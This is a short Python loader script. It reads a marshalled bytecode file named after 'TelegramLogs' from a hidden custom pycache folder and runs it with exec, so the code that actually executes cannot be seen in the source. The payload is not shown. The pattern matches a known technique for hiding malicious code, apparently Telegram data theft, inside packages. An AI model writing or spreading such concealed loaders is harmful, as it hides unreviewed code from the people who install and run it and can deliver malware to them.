
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'TelegramLogs_184f744f3ae34b54a2032d8818a3fc6f.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
